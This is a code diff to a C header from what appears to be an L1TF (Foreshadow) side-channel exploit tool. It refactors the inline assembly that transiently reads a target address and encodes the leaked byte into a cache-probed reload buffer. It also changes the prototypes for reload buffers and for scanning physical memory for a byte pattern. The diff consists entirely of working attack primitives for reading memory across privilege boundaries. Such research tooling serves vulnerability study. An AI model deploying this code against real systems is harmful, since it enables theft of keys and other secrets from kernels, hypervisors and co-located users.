@@ -49,26 +49,25 @@ asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
                : "rax", "rbx", "r12", "r13", "r14");
 }
 
-extern uint64_t reload_label_full(void);
 static inline __attribute__((always_inline)) void
 asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
-               "movq $0xC7DB70C9B1ABE849, %%r12\n"
-               "movq $0x47DF1DF4CD7E16F1, %%r13\n"
-               "leaq reload_label_full(%%rip), %%r14\n"
+               "movl $0xB1ABE849, %%r12d\n"
+               "movl $0xCD7E16F1, %%r13d\n"
+               "leaq handler%=(%%rip), %%r14\n"
                "movq (%[leak_addr]), %%rax\n"
                "and $0xff, %%rax\n"
                "shl $0xc, %%rax\n"
                "prefetcht0 (%[reload_buffer], %%rax)\n"
                "mfence\n"
-               "asm_l1tf_leak_full_loop:\n"
-               "pause\n"
-               "jmp asm_l1tf_leak_full_loop\n"
-               "reload_label_full:"
+               "inf_loop%=:\n"
+               "  pause\n"
+               "  jmp inf_loop%=\n"
+               "handler%=:"
 
                ::[leak_addr] "r"(leak_addr),
                [reload_buffer] "r"(reload_buffer)
-               : "rax");
+               : "rax", "r12", "r13", "r14");
 }
 
 uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);
@@ -87,5 +86,8 @@ leak_addr_t l1tf_leak_buffer_create();
 void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr);
 void l1tf_leak_buffer_free(leak_addr_t *leak);
 
-void *l1tf_scan_physical_memory(size_t length, char needle[length],
-                                size_t stride);
+reload_buffer_t *l1tf_reload_buffer_create();
+void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer);
+
+void *l1tf_scan_physical_memory(uintptr_t start, uintptr_t end, size_t stride,
+                                size_t needle_size, char needle[needle_size]);
